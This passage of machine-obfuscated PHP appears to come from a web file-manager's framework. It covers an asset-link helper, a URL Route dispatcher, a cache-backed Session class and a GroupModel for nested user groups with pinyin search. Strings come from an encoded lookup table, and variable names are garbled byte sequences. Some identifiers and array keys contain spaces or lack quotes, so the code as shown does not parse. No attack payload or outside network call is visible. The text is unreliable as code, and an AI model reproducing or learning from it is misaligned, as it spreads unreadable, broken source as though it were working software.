$ĞãÓÅšÚ; } else { if ($ß›‡ âĞ == $€ú˜¸ùÇ[1594]) { $¢îÊ»·æ = STATIC_PATH . $ĞãÓÅšÚ . $€ú˜¸ùÇ[1593] . $É¼ğÒÒÈ; } else { if ($ß›‡ âĞ == $€ú˜¸ùÇ[1595]) { $¢îÊ»·æ = APP_HOST . $€ú˜¸ùÇ[1596] . $ĞãÓÅšÚ . $€ú˜¸ùÇ[1593] . $É¼ğÒÒÈ; } else { if (isset($ÄÑØŒ’º[$ß›‡ âĞ])) { $¢îÊ»·æ = $ÄÑØŒ’º[$ß›‡ âĞ] . $ĞãÓÅšÚ . $€ú˜¸ùÇ[1593] . $íõïšâõ; } } } } } } if (!$á‚¿‡ªº) { return $¢îÊ»·æ; } echo $¢îÊ»·æ; } public function link($°¿€˜ºÛ = false, $ÂÎü”˜÷ = '') { $²•‰â¨È =& $_SERVER[­á Ş³Ö]; if (!$°¿€˜ºÛ) { $this->link($²•‰â¨È[1597], $²•‰â¨È[1595]); $this->link($²•‰â¨È[1598], $²•‰â¨È[1594]); $this->link($²•‰â¨È[1599], $²•‰â¨È[1594]); $this->link($²•‰â¨È[1600], $²•‰â¨È[1594]); $this->link($²•‰â¨È[1601], $²•‰â¨È[1594]); return; } $ù°…ã¬­ = $this->url($°¿€˜ºÛ, $ÂÎü”˜÷, !1); if (substr($°¿€˜ºÛ, -3) == $²•‰â¨È[1602]) { echo $²•‰â¨È[1603] . $ù°…ã¬­ . $²•‰â¨È[1604] . $²•‰â¨È[231]; } else { if (substr($°¿€˜ºÛ, -4) == $²•‰â¨È[1605]) { echo $²•‰â¨È[1606] . $ù°…ã¬­ . $²•‰â¨È[1607] . $²•‰â¨È[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\x2f\x5d\x2b", "\72\156\x75\155" => "\133\x30\x2d\x39\x5d\53", "\x3a\141\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Œ¨ĞÒâ¿, $¯½ÍÜè) { $‘ˆµ°Éæ =& $_SERVER[­á Ş³Ö]; if ($Œ¨ĞÒâ¿ == $‘ˆµ°Éæ[1608]) { $ïç©õ—… = array_map($‘ˆµ°Éæ[1609], $¯½ÍÜè[0]); $“Öİíú = strpos($¯½ÍÜè[1], $‘ˆµ°Éæ[8]) === 0 ? $¯½ÍÜè[1] : $‘ˆµ°Éæ[8] . $¯½ÍÜè[1]; $æƒ¼¤† = $¯½ÍÜè[2]; } else { $ïç©õ—… = null; $“Öİíú = strpos($¯½ÍÜè[0], $‘ˆµ°Éæ[8]) === 0 ? $¯½ÍÜè[0] : $‘ˆµ°Éæ[8] . $¯½ÍÜè[0]; $æƒ¼¤† = $¯½ÍÜè[1]; } array_push(self::$maps, $ïç©õ—…); array_push(self::$routes, $“Öİíú); array_push(self::$methods, strtoupper($Œ¨ĞÒâ¿)); array_push(self::$callbacks, $æƒ¼¤†); } public static function error($¯Ö£˜‰§) { self::$errorCallback = $¯Ö£˜‰§; } public static function haltOnMatch($é’…‡á° = true) { self::$halts = $é’…‡á°; } public static function dispatch() { $éŠ°ğÙÒ =& $_SERVER[­á Ş³Ö]; $Ğ¨µÚü• = parse_url($_SERVER[$éŠ°ğÙÒ[1610]], PHP_URL_PATH); $€ÂôÓå˜ = $_SERVER[$éŠ°ğÙÒ[159]]; $ú¹¶‚›á = array_keys(static::$patterns); $Ä†ñ‡±Â = array_values(static::$patterns); $ĞŠèÌ×Û = !1; self::$routes = preg_replace($éŠ°ğÙÒ[1272], $éŠ°ğÙÒ[8], self::$routes); if (in_array($Ğ¨µÚü•, self::$routes)) { $—Û’üô² = array_keys(self::$routes, $Ğ¨µÚü•); foreach ($—Û’üô² as $Å…ô±¸) { if (self::$methods[$Å…ô±¸] == $€ÂôÓå˜ || self::$methods[$Å…ô±¸] == $éŠ°ğÙÒ[1611] || in_array($€ÂôÓå˜, self::$maps[$Å…ô±¸])) { $ĞŠèÌ×Û = !0; if (!is_object(self::$callbacks[$Å…ô±¸])) { $×—£Åİ¸ = explode($éŠ°ğÙÒ[8], self::$callbacks[$Å…ô±¸]); $µ¶ÇàÑó = end($×—£Åİ¸); $Ş±åÌÓ = explode($éŠ°ğÙÒ[1204], $µ¶ÇàÑó); $êôÄà½ì = new $Ş±åÌÓ[0](); $êôÄà½ì->{$Ş±åÌÓ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Å…ô±¸]); if (self::$halts) { return; } } } } } else { $ú—ÛğàÀ = 0; foreach (self::$routes as $Å…ô±¸) { if (strpos($Å…ô±¸, $éŠ°ğÙÒ[4]) !== !1) { $Å…ô±¸ = str_replace($ú¹¶‚›á, $Ä†ñ‡±Â, $Å…ô±¸); } if (preg_match($éŠ°ğÙÒ[1612] . $Å…ô±¸ . $éŠ°ğÙÒ[1613], $Ğ¨µÚü•, $ô¼èæã)) { if (self::$methods[$ú—ÛğàÀ] == $€ÂôÓå˜ || self::$methods[$ú—ÛğàÀ] == $éŠ°ğÙÒ[1611] || !empty(self::$maps[$ú—ÛğàÀ]) && in_array($€ÂôÓå˜, self::$maps[$ú—ÛğàÀ])) { $ĞŠèÌ×Û = !0; array_shift($ô¼èæã); if (!is_object(self::$callbacks[$ú—ÛğàÀ])) { $×—£Åİ¸ = explode($éŠ°ğÙÒ[8], self::$callbacks[$ú—ÛğàÀ]); $µ¶ÇàÑó = end($×—£Åİ¸); $Ş±åÌÓ = explode($éŠ°ğÙÒ[1204], $µ¶ÇàÑó); $êôÄà½ì = new $Ş±åÌÓ[0](); if (!method_exists($êôÄà½ì, $Ş±åÌÓ[1])) { echo $éŠ°ğÙÒ[1614]; } else { call_user_func_array(array($êôÄà½ì, $Ş±åÌÓ[1]), $ô¼èæã); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ú—ÛğàÀ], $ô¼èæã); if (self::$halts) { return; } } } } $ú—ÛğàÀ++; } } if ($ĞŠèÌ×Û == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¸ô×ÌØ =& $_SERVER[­á Ş³Ö]; header($_SERVER[$¸ô×ÌØ[1615]] . $¸ô×ÌØ[1616]); echo $¸ô×ÌØ[1617]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$éŠ°ğÙÒ[1610]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $·€Øå¯ä =& $_SERVER[­á Ş³Ö]; static $õ´Ñş¹µ = false; if ($õ´Ñş¹µ) { return $õ´Ñş¹µ; } $÷ˆÏ¡¶é = $GLOBALS[$·€Øå¯ä[6]][$·€Øå¯ä[349]]; self::$sessionTime = $÷ˆÏ¡¶é[$·€Øå¯ä[1618]]; $ ˜ïş¶Á = isset($GLOBALS[$·€Øå¯ä[1619]]) ? $GLOBALS[$·€Øå¯ä[1619]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ ˜ïş¶Á)) { self::$sessionSign = Cookie::get($ ˜ïş¶Á); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ ˜ïş¶Á, self::$sessionSign, self::$sessionTime); $çòŠ–Œ§ = $÷ˆÏ¡¶é[$·€Øå¯ä[1620]]; $ÈéÒÍ = $÷ˆÏ¡¶é[$çòŠ–Œ§]; $ûµÈ¾ãî = $÷ˆÏ¡¶é[$·€Øå¯ä[825]]; switch ($çòŠ–Œ§) { case $·€Øå¯ä[21]: self::$handle = Model($·€Øå¯ä[826]); break; case $·€Øå¯ä[827]: self::$handle = new CacheRedis($ÈéÒÍ, $ûµÈ¾ãî); break; case $·€Øå¯ä[828]: self::$handle = new CacheMemcached($ÈéÒÍ, $ûµÈ¾ãî); break; case $·€Øå¯ä[200]: $ÈéÒÍ[$·€Øå¯ä[84]] = $ÈéÒÍ[$·€Øå¯ä[84]] . $·€Øå¯ä[1621]; self::$handle = new CacheFile($ÈéÒÍ, $ûµÈ¾ãî); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $õ´Ñş¹µ = new self(); return $õ´Ñş¹µ; } public static function getBySign($ŒÕ×²êİ) { $©°ŸÒ¾ = self::$handle->get($ŒÕ×²êİ); $©°ŸÒ¾ = unserialize($©°ŸÒ¾); return is_array($©°ŸÒ¾) ? $©°ŸÒ¾ : array(); } public static function setBySign($‚ø˜çóã, $Ÿ¥è„ˆ) { CacheLock::lock($‚ø˜çóã); self::$handle->set($‚ø˜çóã, serialize($Ÿ¥è„ˆ), self::$sessionTime); CacheLock::unlock($‚ø˜çóã); } public static function sign($×¥ß™Çâ = false) { $×¥ß™Çâ && (self::$sessionSign = $×¥ß™Çâ); self::init(); return self::$sessionSign; } public static function set($“­ÀèûÄ, $µ„„Ô½‡ = false) { self::init(); if (is_array($“­ÀèûÄ)) { foreach ($“­ÀèûÄ as $Š©õ¶ÀÆ => $Ä†Ö¦) { array_set_value(self::$data, $Š©õ¶ÀÆ, $Ä†Ö¦); } } else { array_set_value(self::$data, $“­ÀèûÄ, $µ„„Ô½‡); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ïñò´Æ¦ = false) { self::init(); if (!$ïñò´Æ¦) { return self::$data; } return array_get_value(self::$data, $ïñò´Æ¦); } public static function remove($ì¬¥ƒÚ¥) { self::init(); unset(self::$data[$ì¬¥ƒÚ¥]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[­á Ş³Ö][830])) { self::$handle->clearTimeout(); } } } goto fÖ¬Œ†‹­; F³²é“èù–: define($_SERVER[­á Ş³Ö][238], 1); define($_SERVER[­á Ş³Ö][239], 2); define($_SERVER[­á Ş³Ö][240], 3); goto d÷ŠÀÈ¼Á; A“£”•›÷: class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\155\145" => "\x67\x72\157\165\x70\x5f\x6d\145\x74\141", "\x6d\145\164\141\106\151\145\154\144" => "\147\162\157\x75\160\111\104"); protected function cacheFunctionAlias($Ÿ¥óßí) { $€‚öæ¶œ =& $_SERVER[­á Ş³Ö]; return array($€‚öæ¶œ[1930] => array($Ÿ¥óßí[0], $€‚öæ¶œ[1931]), $€‚öæ¶œ[1932] => array($Ÿ¥óßí[0], $€‚öæ¶œ[1933])); } protected function getInfo($¢ı”¡®•, $§¸·ÁàÚ = false) { $âüîØ°Ï = $this->getInfoSimple($¢ı”¡®•); if (!$âüîØ°Ï) { return !1; } if ($§¸·ÁàÚ) { return $this->_listDataApplyItem($âüîØ°Ï); } return $this->cacheFunctionGet($_SERVER[­á Ş³Ö][1934], $¢ı”¡®•); } protected function getInfoSimple($¡´Ä‘şÏ, $è·¦ø = false) { $Ÿ¦—•ï™ =& $_SERVER[­á Ş³Ö]; if ($è·¦ø) { $ü‡í†Ç = array($Ÿ¦—•ï™[1852] => intval($¡´Ä‘şÏ)); $¹î†·ß = $this->where($ü‡í†Ç)->find(); return is_array($¹î†·ß) ? $¹î†·ß : array(); } return $this->cacheFunctionGet($Ÿ¦—•ï™[1935], $¡´Ä‘şÏ); } protected function groupAdd($¥ŠÅ‘ß›) { $ÃŸìÒ =& $_SERVER[­á Ş³Ö]; if (!$¥ŠÅ‘ß›[$ÃŸìÒ[432]] && isset($¥ŠÅ‘ß›[$ÃŸìÒ[1852]]) && $¥ŠÅ‘ß›[$ÃŸìÒ[1852]] == 1) { if ($îÆˆÈËÛ = $this->getInfoSimple($¥ŠÅ‘ß›[$ÃŸìÒ[1852]], !0)) { return $¥ŠÅ‘ß›[$ÃŸìÒ[1852]]; } } else { $îÆˆÈËÛ = $this->getInfoSimple($¥ŠÅ‘ß›[$ÃŸìÒ[432]]); if (!$îÆˆÈËÛ) { return !1; } } $øİ¹’¢Ï = $ÃŸìÒ[521]; if ($îÆˆÈËÛ[$ÃŸìÒ[511]]) { $øİ¹’¢Ï = $îÆˆÈËÛ[$ÃŸìÒ[511]] . $îÆˆÈËÛ[$ÃŸìÒ[1852]] . $ÃŸìÒ[50]; } $„­§‰¤ = array($ÃŸìÒ[420] => $this->groupNameAuto($¥ŠÅ‘ß›[$ÃŸìÒ[432]], $¥ŠÅ‘ß›[$ÃŸìÒ[32]]), $ÃŸìÒ[401] => $¥ŠÅ‘ß›[$ÃŸìÒ[432]], $ÃŸìÒ[580] => $øİ¹’¢Ï, $ÃŸìÒ[1936] => $¥ŠÅ‘ß›[$ÃŸìÒ[1839]], $ÃŸìÒ[1937] => 0, $ÃŸìÒ[1856] => 0); if (isset($¥ŠÅ‘ß›[$ÃŸìÒ[1876]])) { $„­§‰¤[$ÃŸìÒ[1876]] = $¥ŠÅ‘ß›[$ÃŸìÒ[1876]]; } else { $ı¦ÑÁ‘À = $this->max($ÃŸìÒ[1876]); if (!$ı¦ÑÁ‘À) { $ı¦ÑÁ‘À = 0; } $„­§‰¤[$ÃŸìÒ[1876]] = $ı¦ÑÁ‘À + 1; } if (!empty($¥ŠÅ‘ß›[$ÃŸìÒ[1852]])) { $„­§‰¤[$ÃŸìÒ[1852]] = $¥ŠÅ‘ß›[$ÃŸìÒ[1852]]; } $ÆÜ‘àïŒ = $this->add($„­§‰¤); $this->setNamePinyin($ÆÜ‘àïŒ, $„­§‰¤[$ÃŸìÒ[32]]); if (isset($¥ŠÅ‘ß›[$ÃŸìÒ[1938]])) { $this->metaSet($ÆÜ‘àïŒ, array($ÃŸìÒ[1938] => $¥ŠÅ‘ß›[$ÃŸìÒ[1938]], $ÃŸìÒ[1939] => $¥ŠÅ‘ß›[$ÃŸìÒ[1939]])); unset($¥ŠÅ‘ß›[$ÃŸìÒ[1938]]); unset($¥ŠÅ‘ß›[$ÃŸìÒ[1939]]); } Model($ÃŸìÒ[1335])->groupRootAdd($ÆÜ‘àïŒ); $this->_clearCache($¥ŠÅ‘ß›[$ÃŸìÒ[432]]); return $ÆÜ‘àïŒ; } protected function groupEdit($ÖçàÌŠœ, $‹Îòœ¿õ) { $¡«Õ“£å =& $_SERVER[­á Ş³Ö]; $–¿ğµÏæ = $this->getInfoSimple($ÖçàÌŠœ); if (!$–¿ğµÏæ) { return !1; } if (!empty($‹Îòœ¿õ[$¡«Õ“£å[432]])) { $ª¥ù­…ƒ = $this->getInfoSimple($‹Îòœ¿õ[$¡«Õ“£å[432]]); if (!$ª¥ù­…ƒ) { return !1; } if ($–¿ğµÏæ[$¡«Õ“£å[1852]] == $ª¥ù­…ƒ[$¡«Õ“£å[1852]]) { return !1; } if ($‹Îòœ¿õ[$¡«Õ“£å[432]] != $–¿ğµÏæ[$¡«Õ“£å[432]]) { if ($ª¥ù­…ƒ[$¡«Õ“£å[511]] !== $–¿ğµÏæ[$¡«Õ“£å[511]] && strpos($ª¥ù­…ƒ[$¡«Õ“£å[511]], $–¿ğµÏæ[$¡«Õ“£å[511]] . $–¿ğµÏæ[$¡«Õ“£å[1852]] . $¡«Õ“£å[50]) === 0) { return !1; } $‹Îòœ¿õ[$¡«Õ“£å[580]] = $ª¥ù­…ƒ[$¡«Õ“£å[511]] . $‹Îòœ¿õ[$¡«Õ“£å[432]] . $¡«Õ“£å[50]; $this->_changeChildLevel($–¿ğµÏæ, $ª¥ù­…ƒ); $this->_clearCache($ª¥ù­…ƒ[$¡«Õ“£å[1852]]); $this->_clearCache($–¿ğµÏæ[$¡«Õ“£å[432]]); } } if (isset($‹Îòœ¿õ[$¡«Õ“£å[32]])) { $this->setNamePinyin($ÖçàÌŠœ, $‹Îòœ¿õ[$¡«Õ“£å[32]]); } if (isset($‹Îòœ¿õ[$¡«Õ“£å[1938]])) { $this->metaSet($ÖçàÌŠœ, array($¡«Õ“£å[1938] => $‹Îòœ¿õ[$¡«Õ“£å[1938]], $¡«Õ“£å[1939] => $‹Îòœ¿õ[$¡«Õ“£å[1939]])); unset($‹Îòœ¿õ[$¡«Õ“£å[1938]]); unset($‹Îòœ¿õ[$¡«Õ“£å[1939]]); } $this->_clearChildrenCache($–¿ğµÏæ); return $this->where(array($¡«Õ“£å[1940] => $ÖçàÌŠœ))->save($‹Îòœ¿õ); } private function _clearChildrenCache($È˜•—äà) { $È–İ†ç‘ =& $_SERVER[­á Ş³Ö]; $Æñ¯ğÂ± = array($È–İ†ç‘[580] => array($È–İ†ç‘[540], $È˜•—äà[$È–İ†ç‘[511]] . $È˜•—äà[$È–İ†ç‘[1852]] . $È–İ†ç‘[541])); $Ï·¾¯Ö = $this->field($È–İ†ç‘[1852])->where($Æñ¯ğÂ±)->select(); foreach ($Ï·¾¯Ö as $„½¯«®¢) { $this->_clearCache($„½¯«®¢[$È–İ†ç‘[1852]]); } } private function _clearCache($ÎÛ‰ãÌ) { $á‘ªğäõ =& $_SERVER[­á Ş³Ö]; $this->cacheFunctionClear($á‘ªğäõ[1934], $ÎÛ‰ãÌ); $this->cacheFunctionClear($á‘ªğäõ[1935], $ÎÛ‰ãÌ); } private function _changeChildLevel($Çîœë, $Í¶†áÃ, $÷»öş²Í = false) { $¾‰ÖĞíÙ =& $_SERVER[­á Ş³Ö]; $‘ÚÚæßë = $Çîœë[$¾‰ÖĞíÙ[511]] . $Çîœë[$¾‰ÖĞíÙ[1852]] . $¾‰ÖĞíÙ[50]; $¹»ÊÙÊ¾ = $Í¶†áÃ[$¾‰ÖĞíÙ[511]] . $Í¶†áÃ[$¾‰ÖĞíÙ[1852]] . $¾‰ÖĞíÙ[50] . $Çîœë[$¾‰ÖĞíÙ[1852]] . $¾‰ÖĞíÙ[50]; if ($÷»öş²Í) { $¹»ÊÙÊ¾ = $Í¶†áÃ[$¾‰ÖĞíÙ[511]] . $Í¶†áÃ[$¾‰ÖĞíÙ[1852]] . $¾‰ÖĞíÙ[50]; } $óÂîàÁÉ = array($¾‰ÖĞíÙ[580] => array($¾‰ÖĞíÙ[540], $Çîœë[$¾‰ÖĞíÙ[511]] . $Çîœë[$¾‰ÖĞíÙ[1852]] . $¾‰ÖĞíÙ[541])); $Ş‰›ºÕ = array($¾‰ÖĞíÙ[580] => array($¾‰ÖĞíÙ[589], "\162\145\x70\x6c\141\143\145\50\160\x61\x72\145\x6e\164\x4c\x65\166\x65\154\x2c\x27{$‘ÚÚæßë}\x27\54\x27{$¹»ÊÙÊ¾}\47\51")); $this->_clearChildrenCache($Çîœë); $this->where($óÂîàÁÉ)->data($Ş‰›ºÕ)->save(); } public function setNamePinyin($˜äÎÀ‰‰, $ìÕ—ÀÚƒ = false) { $³Òèîêõ =& $_SERVER[­á Ş³Ö]; if (!$ìÕ—ÀÚƒ) { $–‚”Õä¦ = $this->getInfoSimple($˜äÎÀ‰‰); $ìÕ—ÀÚƒ = $–‚”Õä¦[$³Òèîêõ[32]]; } if (!Input::check($ìÕ—ÀÚƒ, $³Òèîêõ[583])) { $this->metaSet($˜äÎÀ‰‰, $³Òèîêõ[465], null); $this->metaSet($˜äÎÀ‰‰, $³Òèîêõ[464], null); return; } $Ååó§˜ = array($³Òèîêõ[465] => str_replace($³Òèîêõ[53], $³Òèîêõ[12], Pinyin::get($ìÕ—ÀÚƒ)), $³Òèîêõ[464] => Pinyin::get($ìÕ—ÀÚƒ, $³Òèîêõ[584])); $this->metaSet($˜äÎÀ‰‰, $Ååó§˜); } protected function groupStatus($âŸ…°è¡, $˜ˆß£Ø) { $¹•íƒ°Ù =& $_SERVER[­á Ş³Ö]; $—•Ä–Ö” = $this->getInfoSimple($âŸ…°è¡); if (!$—•Ä–Ö”) { return !1; } if ($˜ˆß£Ø == $¹•íƒ°Ù[88]) { $¤Ğü“»ã = $this->parentLevelArray($—•Ä–Ö”[$¹•íƒ°Ù[511]]); } else { $Æ¥Ù‘±Ÿ = array($¹•íƒ°Ù[580] => array($¹•íƒ°Ù[540], $—•Ä–Ö”[$¹•íƒ°Ù[511]] . $—•Ä–Ö”[$¹•íƒ°Ù[1852]] . $¹•íƒ°Ù[541])); $¤Ğü“»ã = $this->where($Æ¥Ù‘±Ÿ)->field($¹•íƒ°Ù[1852])->select(); $¤Ğü“»ã = array_to_keyvalue($¤Ğü“»ã, $¹•íƒ°Ù[12], $¹•íƒ°Ù[1852]); } $¤Ğü“»ã[] = $—•Ä–Ö”[$¹•íƒ°Ù[1852]]; $›¯ÈÍöƒ = array(); foreach ($¤Ğü“»ã as $âŸ…°è¡) { $›¯ÈÍöƒ[] = array($¹•íƒ°Ù[1852] => $âŸ…°è¡, $¹•íƒ°Ù[94] => $¹•íƒ°Ù[746], $¹•íƒ°Ù[374] => $˜ˆß£Ø); $this->_clearCache($âŸ…°è¡); } return Model($¹•íƒ°Ù[1941])->addAll($›¯ÈÍöƒ, array(), !0); } protected function groupRemove($«²«œ‘Œ, $Îä­İˆå = false) { $€Ì…¯ê¦ =& $_SERVER[­á Ş³Ö]; $´ı Ê¯Š = array($€Ì…¯ê¦[1852] => $«²«œ‘Œ); $Æ‡ñ«ĞÆ = $this->where($´ı Ê¯Š)->find(); if (!$Æ‡ñ«ĞÆ || $Æ‡ñ«ĞÆ[$€Ì…¯ê¦[432]] == 0) { return !1; } if (!$Îä­İˆå) { $‡ ­£ùŠ = $this->getInfoSimple($Æ‡ñ«ĞÆ[$€Ì…¯ê¦[432]]); $this->_changeChildLevel($Æ‡ñ«ĞÆ, $‡ ­£ùŠ, !0); $this->where(array($€Ì…¯ê¦[432] => $«²«œ‘Œ))->save(array($€Ì…¯ê¦[432] => $Æ‡ñ«ĞÆ[$€Ì…¯ê¦[432]])); $this->_clearCache($‡ ­£ùŠ[$€Ì…¯ê¦[1852]]); } Model($€Ì…¯ê¦[1941])->where($´ı Ê¯Š)->delete(); Model($€Ì…¯ê¦[1942])->where($´ı Ê¯Š)->delete(); Model($€Ì…¯ê¦[822])->groupRootRemove($«²«œ‘Œ); $this->_clearCache($Æ‡ñ«ĞÆ[$€Ì…¯ê¦[432]]); return $this->where($´ı Ê¯Š)->delete(); } protected function groupSort($óšŞ€ö«) { $½¢‘ö•˜ =& $_SERVER[­á Ş³Ö]; $½ƒöµ‘œ = array(); foreach ($óšŞ€ö« as $¬‘ÎññÊ => $’ŸÜÌö¼) { $½ƒöµ‘œ[] = array($½¢‘ö•˜[1852], $’ŸÜÌö¼, $½¢‘ö•˜[1876], $¬‘ÎññÊ + 1); } $this->saveAll($½ƒöµ‘œ); } public function listData() { $±‰©Ã°« = $this->_makeOrder()->selectPage(50); $this->_listDataApply($±‰©Ã°«[$_SERVER[­á Ş³Ö][369]]); return $±‰©Ã°«; } private function _makeOrder($áŞÙç§” = '') { $³ÛïøÓ¬ =& $_SERVER[­á Ş³Ö]; $ûŸ†ù«É = array($³ÛïøÓ¬[1852], $³ÛïøÓ¬[32], $³ÛïøÓ¬[1841], $³ÛïøÓ¬[201]); $Â¡»×œİ = array($³ÛïøÓ¬[450] => $³ÛïøÓ¬[451], $³ÛïøÓ¬[452] => $³ÛïøÓ¬[453]); $Ï“¤ÙĞŸ = Input::get($³ÛïøÓ¬[457], $³ÛïøÓ¬[7], $³ÛïøÓ¬[1856], $ûŸ†ù«É); $¦òûÈÏ = Input::get($³ÛïøÓ¬[458], $³ÛïøÓ¬[7], $³ÛïøÓ¬[1943], array($³ÛïøÓ¬[1943], $³ÛïøÓ¬[452])); $¦òûÈÏ = $Â¡»×œİ[$¦òûÈÏ]; $áŞÙç§” = $áŞÙç§” . "{$Ï“¤ÙĞŸ}\x20{$¦òûÈÏ}\54\40\x67\162\x6f\x75\160\x49\x44\x20\141\163\x63"; return $this->order($áŞÙç§”); } public function listChild($šÏµª²ú) { $§ß°ßµô =& $_SERVER[­á Ş³Ö]; $Õü‹ÌÇã = $this->where(array($§ß°ßµô[432] => $šÏµª²ú))->_makeOrder()->selectPage(200); $this->_listDataApply($Õü‹ÌÇã[$§ß°ßµô[369]]); return $Õü‹ÌÇã; } public function listChildIds($çüÔ’÷–) { $¬ºÑÄÈ =& $_SERVER[­á Ş³Ö]; if (is_string($à«Â¯Ñ)) { $çüÔ’÷– = explode($¬ºÑÄÈ[50], $çüÔ’÷–); } $ÔËı–Ê° = $this->where(array($¬ºÑÄÈ[1852] => array($¬ºÑÄÈ[7], $çüÔ’÷–)))->field($¬ºÑÄÈ[1944])->select(); if (!$ÔËı–Ê°) { return !1; } $Õ«¬ÎÂÈ = array(); foreach ($ÔËı–Ê° as $ŠÔ¢èá) { $Õ«¬ÎÂÈ[] = "\x73\145\154\145\x63\164\40\147\x72\157\x75\160\111\x44\40\x66\x72\x6f\x6d\40\140\147\x72\x6f\165\x70\x60\40\167\x68\145\162\145\x20\x70\141\162\x65\x6e\164\114\145\x76\145\x6c\x20\154\x69\153\145\x20\x27{$ŠÔ¢èá[$¬ºÑÄÈ[511]]}{$ŠÔ¢èá[$¬ºÑÄÈ[1852]]}\54\x25\47"; } $Õ«¬ÎÂÈ = implode($¬ºÑÄÈ[1945], $Õ«¬ÎÂÈ); $ÔËı–Ê° = $this->query($Õ«¬ÎÂÈ); if (!$ÔËı–Ê°) { return array(); } $çüÔ’÷– = array_to_keyvalue($ÔËı–Ê°, $¬ºÑÄÈ[12], $¬ºÑÄÈ[1852]); return array_unique($çüÔ’÷–); } public function listByID($”É¢€Ü) { $Œ×Ê¼£Â =& $_SERVER[­á Ş³Ö]; if (!$”É¢€Ü) { return array(); } $”°¿ìş½ = array($Œ×Ê¼£Â[1852] => array($Œ×Ê¼£Â[7], $”É¢€Ü)); $¼ô¾Üİ = $this->where($”°¿ìş½)->select(); $¼ô¾Üİ = array_sort_keep($¼ô¾Üİ, $Œ×Ê¼£Â[1852], $”É¢€Ü); $this->_listDataApply($¼ô¾Üİ); return $¼ô¾Üİ; } public function listSearch($³‡åŞà) { $€©£á…‚ =& $_SERVER[­á Ş³Ö]; $Ñ˜†Ñ–Á = $³‡åŞà[$€©£á…‚[1946]]; $šøú²‡ı = isset($³‡åŞà[$€©£á…‚[1947]]) ? $³‡åŞà[$€©£á…‚[1947]] : !1; if (!trim($Ñ˜†Ñ–Á)) { return !1; } $Ñ˜†Ñ–Á = str_replace($€©£á…‚[1948], $€©£á…‚[1949], $Ñ˜†Ñ–Á); $î­Şşõ« = array($€©£á…‚[1852] => array($€©£á…‚[383], "{$Ñ˜†Ñ–Á}\45"), $€©£á…‚[32] => array($€©£á…‚[383], "\45{$Ñ˜†Ñ–Á}\x25"), $€©£á…‚[996] => $€©£á…‚[1950]); if ($šøú²‡ı) { $¥¬àíòÁ = $this->getInfoSimple($šøú²‡ı); $êï¢’õ = $¥¬àíòÁ[$€©£á…‚[511]] . $šøú²‡ı . $€©£á…‚[541]; $î­Şşõ« = array($î­Şşõ«, array($€©£á…‚[511] => array($€©£á…‚[383], $êï¢’õ))); } $î­Şşõ« = $this->parseWhereLike($î­Şşõ«); $š´Ş•Í‹ = $this->_makeOrder()->where($î­Şşõ«)->selectPage(20); $š´Ş•Í‹ = $š´Ş•Í‹ ? $š´Ş•Í‹ : array($€©£á…‚[369] => array(), $€©£á…‚[366] => array()); if (!$š´Ş•Í‹ || count($š´Ş•Í‹[$€©£á…‚[369]]) < 5 && Input::check($Ñ˜†Ñ–Á, $€©£á…‚[318])) { $µ’â§éï = $this->groupChildrenAll($šøú²‡ı); $ä€ù®À¥ = $this->_searchFromMeta($€©£á…‚[464], $Ñ˜†Ñ–Á, 10, $µ’â§éï); $ºÙ—‘ì = $this->_searchFromMeta($€©£á…‚[465], $Ñ˜†Ñ–Á, 10, $µ’â§éï); $æï÷ÏÂ× = array_merge($ä€ù®À¥, $ºÙ—‘ì, $š´Ş•Í‹[$€©£á…‚[369]]); $š´Ş•Í‹[$€©£á…‚[369]] = array_unique_by_key($æï÷ÏÂ×, $€©£á…‚[1852]); $š´Ş•Í‹[$€©£á…‚[366]][$€©£á…‚[367]] = count($š´Ş•Í‹[$€©£á…‚[369]]); $š´Ş•Í‹[$€©£á…‚[366]][$€©£á…‚[368]] = ceil($š´Ş•Í‹[$€©£á…‚[366]][$€©£á…‚[367]] / $š´Ş•Í‹[$€©£á…‚[366]][$€©£á…‚[363]]); } $this->_listDataApply($š´Ş•Í‹[$€©£á…‚[369]]); return $š´Ş•Í‹; } protected function groupChildrenAll($‰á¾‘¾¿) { $¨µéÜ·ê =& $_SERVER[­á Ş³Ö]; if (!$‰á¾‘¾¿) { return !1; } if (is_string($‰á¾‘¾¿)) { $‰á¾‘¾¿ = array($‰á¾‘¾¿); } $§ãËŠîÎ = $‰á¾‘¾¿; foreach ($‰á¾‘¾¿ as $²‡±˜µ£) { $ÙÄˆÏìŠ = $this->getInfoSimple($²‡±˜µ£); $”Âœê¬ = array($¨µéÜ·ê[511] => array($¨µéÜ·ê[383], $ÙÄˆÏìŠ[$¨µéÜ·ê[511]] . $²‡±˜µ£ . $¨µéÜ·ê[541])); $é£´‡ÄÜ = $this->field($¨µéÜ·ê[1852])->where($”Âœê¬)->select(); $§ãËŠîÎ = array_merge($§ãËŠîÎ, array_to_keyvalue($é£´‡ÄÜ, $¨µéÜ·ê[12], $¨µéÜ·ê[1852])); } return array_unique($§ãËŠîÎ); } private function _searchFromMeta($´´Ò§ö¦, $Æ‡ú“Ÿæ, $óêäıõ—, $¼„ùÏ´º) { $¸ã™ĞÁ =& $_SERVER[­á Ş³Ö]; $Æ‡ú“Ÿæ = strtolower($Æ‡ú“Ÿæ); $±×ÕÀ‰ = array($¸ã™ĞÁ[94] => $´´Ò§ö¦, $¸ã™ĞÁ[374] => array($¸ã™ĞÁ[383], 